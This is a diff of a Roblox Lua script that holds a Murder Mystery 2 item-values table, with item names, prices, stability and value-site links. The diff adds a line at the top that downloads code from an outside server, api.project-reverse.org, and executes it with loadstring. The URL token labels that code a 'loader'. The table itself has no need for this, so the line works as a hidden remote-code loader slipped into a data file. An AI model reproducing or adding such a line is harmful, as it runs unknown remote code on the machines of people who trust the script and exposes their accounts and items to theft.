@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImZmNjdmY2QzLWVkMTEtNDY0Ni1hOTM2LWYyMWI5OTI2OTlkYSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL2dpdGh1Yi5jb20vcmVzcHB2cC1iZWVwL21tMnZhbHVlcy9lZGl0L21haW4vbWFpbi5sdWF1In19"))()
 local items = {
     {"ancients", "Batwing", "Batwing", "40", "https://supremevalues.com/mm2/ancients?item=Batwing", "Stable", "-2"},
     {"ancients", "Celestial", "Celestial", "1,950", "https://supremevalues.com/mm2/ancients?item=Celestial", "Stable", "-50"},
